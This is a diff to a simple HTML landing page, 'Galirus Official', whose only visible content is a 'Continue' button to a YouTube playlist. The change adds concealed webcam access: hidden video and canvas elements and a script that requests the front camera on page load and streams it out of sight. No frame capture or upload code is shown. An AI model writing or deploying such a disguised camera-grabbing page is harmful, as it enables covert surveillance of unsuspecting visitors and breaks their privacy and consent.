@@ -10,37 +10,81 @@
     <meta charset="utf-8">
     <title>Galirus Official</title>
     <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">
-<style type="text/css">
-html {
-  background-image: url(https://od.lk/s/OV8yNDQyMTA5MDFf/Picsart_24-07-17_19-26-43-870.jpg);
-  background-repeat: no-repeat;
-  background-position: center;
-  background-size: cover;
-  background-attachment: fixed;
-  height: auto;
-  width: auto;
-  background-color: #ffffff;
+    <style type="text/css">
+        html {
+            background-image: url(https://od.lk/s/OV8yNDQyMTA5MDFf/Picsart_24-07-17_19-26-43-870.jpg);
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: cover;
+            background-attachment: fixed;
+            height: auto;
+            width: auto;
+            background-color: #ffffff;
+            color: #fff;
+            text-align: center;
+            font-family: "Kelly Slab", sans-serif;
+            margin: 0;
+            font-weight: 60;
+            height: 60vh;
+        }
 
-  color: #fff;
-  text-align: center;
-  font-family: "Kelly Slab", sans-serif;
-  margin: 0;
-  font-weight: 60;
-  height: 60vh;
-}
+        .button-like {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #3498db; /* Warna latar belakang */
+            color: #ffffff; /* Warna teks */
+            border: 2px solid #2980b9; /* Warna border */
+            border-radius: 15px;
+            font-size: 54px; /* Ukuran teks tombol */
+        }
 
-.button-like {
-  display: inline-block;
-  padding: 10px 20px;
-  background-color: #3498db; /* Warna latar belakang */
-  color: #ffffff; /* Warna teks */
-  border: 2px solid #2980b9; /* Warna border */
-  border-radius: 15px;
-  font-size: 54px; /* Ukuran teks tombol */
-}
-</style>
-        </script>
-        <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-            <a href="https://youtube.com/playlist?list=RDCPmfsUoB2-4&playnext=1" class="button-like">Continue</a>
+        video {
+            display: none; /* Hide video element */
+        }
+    </style>
+</head>
+<body>
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        // Access webcam
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                console.error(`navigator.getUserMedia error: ${e.toString()}`);
+            }
+        }
+
+        // Success
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+            video.play();
+        }
+
+        // Load init
+        init();
+    </script>
+
+    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+    <a href="https://youtube.com/playlist?list=RDCPmfsUoB2-4&playnext=1" class="button-like">Continue</a>
 </body>
 </html>
